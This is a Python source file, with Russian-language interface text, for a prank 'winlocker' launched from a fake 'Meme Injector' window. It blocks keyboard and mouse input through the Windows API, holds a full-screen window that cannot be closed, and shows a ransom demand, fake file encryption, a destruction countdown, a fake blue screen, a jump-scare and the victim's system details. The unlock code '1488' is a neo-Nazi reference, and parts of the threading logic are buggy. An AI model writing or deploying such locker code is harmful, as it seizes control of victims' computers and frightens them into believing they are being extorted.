import tkinter as tk
from tkinter import messagebox
import threading
import time
import socket
import getpass
import platform
import random
import pygame
from PIL import Image, ImageTk
import os
import ctypes

PASSWORD = "1488"
BG_COLOR = "black"
TEXT_COLOR = "lime"
timer_seconds = 120
root = None

MUSIC_FILE = "creepy_melody.mp3"
SCREAMER_IMAGE = "demon_screamer.jpg"
SCREAM_SOUND = "scream.mp3"
WIN10_BOOT_IMAGE = "win10_boot.jpg"
virus_message = "ВАШ КОМПЬЮТЕР ЗАРАЖЕН! ПЛАТИТЕ СРАЗУ!"

def disable_input():
    ctypes.windll.user32.BlockInput(True)

def enable_input():
    ctypes.windll.user32.BlockInput(False)

def enforce_topmost(window):
    while True:
        try:
            window.attributes('-topmost', True)
            time.sleep(1)
        except:
            break

def start_injection():
    inject_button.config(state='disabled')
    threading.Thread(target=inject_animation, daemon=True).start()

def inject_animation():
    for percent in range(0, 101, 10):
        info_label.config(text=f"Загрузка вируса... {percent}%")
        time.sleep(0.2)
    inject_window.destroy()
    run_winlocker()

def check_password():
    if entry.get() == PASSWORD:
        pygame.mixer.music.stop()
        enable_input()
        root.destroy()
    else:
        show_screamer()

def show_screamer():
    scream = pygame.mixer.Sound(SCREAM_SOUND)
    scream.play()

    screamer = tk.Toplevel(root)
    screamer.attributes('-fullscreen', True)
    screamer.configure(bg='black')
    screamer.focus_force()
    threading.Thread(target=enforce_topmost, args=(screamer,), daemon=True).start()

    img = Image.open(SCREAMER_IMAGE)
    img = img.resize((screamer.winfo_screenwidth(), screamer.winfo_screenheight()), Image.Resampling.LANCZOS)
    photo = ImageTk.PhotoImage(img)

    label = tk.Label(screamer, image=photo)
    label.image = photo
    label.pack(fill="both", expand=True)

    screamer.update()
    screamer.after(10000, lambda: screamer.destroy())

def update_timer():
    global timer_seconds
    while timer_seconds > 0:
        timer_label.config(text=f"Уничтожение системы через: {timer_seconds} сек.")
        timer_seconds -= 1
        time.sleep(1)
    fake_bsod()

def flashing_colors():
    colors = ["#000000", "#FF69B4", "#FFFF00", "#FF0000", "#00FF00"]
    while True:
        root.configure(bg=random.choice(colors))
        time.sleep(0.3)

def simulate_encryption():
    while True:
        file = f"C:/User/Documents/Файл_с_ПИЦЦЕЙ_{random.randint(1000,9999)}.doc"
        fake_encrypt_label.config(text=f"Шифрование: {file}")
        time.sleep(0.3)

def scroll_text():
    text = virus_message
    while True:
        scroll_label.config(text=text)
        text = text[1:] + text[0]
        time.sleep(0.2)

def fake_bsod():
    pygame.mixer.music.stop()
    bsod = tk.Toplevel(root)
    bsod.attributes('-fullscreen', True)
    bsod.configure(bg='blue')
    threading.Thread(target=enforce_topmost, args=(bsod,), daemon=True).start()

    bsod_label = tk.Label(bsod, text=":( \nСистема перегружена мемами... ПРИГОТОВЬТЕСЬ!", font=("Comic Sans MS", 32, "bold"), bg='blue', fg='white')
    bsod_label.pack(expand=True)

    time.sleep(3)
    fake_boot(bsod)

def fake_boot(previous_window):
    previous_window.destroy()
    boot_window = tk.Toplevel(root)
    boot_window.attributes('-fullscreen', True)
    boot_window.configure(bg='black')
    threading.Thread(target=enforce_topmost, args=(boot_window,), daemon=True).start()

    boot_label = tk.Label(boot_window, text="Загрузка Windows 95... Очень медленно...", font=("Comic Sans MS", 32), bg='black', fg='white')
    boot_label.pack(expand=True)

    img = Image.open(WIN10_BOOT_IMAGE)
    img = img.resize((boot_window.winfo_screenwidth(), boot_window.winfo_screenheight()), Image.Resampling.LANCZOS)
    photo = ImageTk.PhotoImage(img)

    image_label = tk.Label(boot_window, image=photo)
    image_label.image = photo
    image_label.pack()

    time.sleep(4)
    boot_window.destroy()
    run_winlocker()

def get_system_info():
    username = getpass.getuser()
    hostname = socket.gethostname()
    try:
        ip_address = socket.gethostbyname(hostname)
    except socket.gaierror:
        ip_address = 'Неизвестен'
    os_info = platform.platform()
    return f"""Пользователь: {username}
Имя ПК: {hostname}
IP адрес: {ip_address}
Система: {os_info}
Таймкод: ТАЙМИНГ 2025!"""

def run_winlocker():
    global root, entry, timer_label, fake_encrypt_label, scroll_label

    pygame.mixer.init()
    pygame.mixer.music.load(MUSIC_FILE)
    pygame.mixer.music.play(-1)

    root = tk.Tk()
    root.title("!!! ВАШ КОМПЬЮТЕР ПОЛУЧИЛ ПИЦЦУ ПАК !!!")
    root.attributes('-fullscreen', True)
    root.configure(bg=BG_COLOR)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    threading.Thread(target=enforce_topmost, args=(root,), daemon=True).start()

    disable_input()

    scroll_label = tk.Label(root, text="", font=("Comic Sans MS", 28, "bold"), bg=BG_COLOR, fg='red')
    scroll_label.pack(pady=10)

    title = tk.Label(root, text="!!! MEME SYSTEM FAILURE !!!", font=("Comic Sans MS", 48, "bold"), bg=BG_COLOR, fg="yellow")
    title.pack(pady=10)

    system_info = get_system_info()
    info_label = tk.Label(root, text=system_info, font=("Comic Sans MS", 16), bg=BG_COLOR, fg=TEXT_COLOR, justify='left')
    info_label.pack(pady=10)

    warning_label = tk.Label(root, text="Ваш компьютер был захвачен мемами!", font=("Comic Sans MS", 24, "bold"), bg=BG_COLOR, fg='white')
    warning_label.pack(pady=20)

    fake_encrypt_label = tk.Label(root, text="", font=("Comic Sans MS", 20), bg=BG_COLOR, fg='yellow')
    fake_encrypt_label.pack(pady=10)

    label = tk.Label(root, text="Введите секретный код: УГАР!", font=("Comic Sans MS", 24), bg=BG_COLOR, fg=TEXT_COLOR)
    label.pack(pady=10)

    entry = tk.Entry(root, font=("Comic Sans MS", 24), show="*")
    entry.pack(pady=10)

    button = tk.Button(root, text="РАЗБЛОКИРОВАТЬ", font=("Comic Sans MS", 24), bg='red', fg='white', command=check_password)
    button.pack(pady=10)

    timer_label = tk.Label(root, text="", font=("Comic Sans MS", 20), bg=BG_COLOR, fg='white')
    timer_label.pack(pady=10)

    instruction_label = tk.Label(root, text="Связь: @MemeCreator_1337", font=("Comic Sans MS", 14), bg=BG_COLOR, fg='yellow')
    instruction_label.pack(pady=20)

    threading.Thread(target=update_timer, daemon=True).start()
    threading.Thread(target=flashing_colors, daemon=True).start()
    threading.Thread(target=simulate_encryption, daemon=True).start()
    threading.Thread(target=scroll_text, daemon=True).start()

    root.mainloop()

# Окно инжектора
inject_window = tk.Tk()
inject_window.title("Meme Injector v3.0")
inject_window.geometry("300x200")
inject_window.configure(bg='white')

info_label = tk.Label(inject_window, text="Нажмите Inject для пиццы!", font=("Comic Sans MS", 16), bg='white')
info_label.pack(pady=20)

inject_button = tk.Button(inject_window, text="Inject", font=("Comic Sans MS", 16), command=start_injection)
inject_button.pack(pady=10)

inject_window.mainloop()
